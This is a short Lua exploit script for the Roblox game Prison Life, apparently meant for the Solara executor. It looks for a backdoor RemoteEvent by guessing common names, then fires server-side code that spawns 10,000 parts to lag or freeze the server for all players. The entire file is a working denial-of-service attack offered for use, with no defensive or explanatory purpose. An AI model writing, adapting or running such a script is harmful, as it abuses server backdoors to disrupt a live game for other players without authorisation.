-- Prison Life backdoor lag/freeze script (Solara compatible)
local possibleNames = {"Loadstring", "Remote", "Execute", "Script", "Net", "MainModule", "Hax"}
local remote = nil

-- Step 1: Find a RemoteEvent
for _, name in ipairs(possibleNames) do
    for _, service in ipairs({game:GetService("ReplicatedStorage"), game:GetService("Workspace")}) do
        local obj = service:FindFirstChild(name)
        if obj and obj:IsA("RemoteEvent") then
            remote = obj
            warn("Backdoor RemoteEvent found at:", obj:GetFullName())
            break
        end
    end
    if remote then break end
end

-- Step 2: Fire lag payload if found
if remote then
    remote:FireServer([[
        -- Lag/freeze everyone by creating thousands of parts
        for i = 1, 10000 do
            local p = Instance.new("Part")
            p.Size = Vector3.new(1,1,1)
            p.Anchored = true
            p.Position = Vector3.new(math.random()*500, 50, math.random()*500)
            p.Parent = workspace
        end
    ]])
else
    warn("No known RemoteEvent backdoor found.")
end


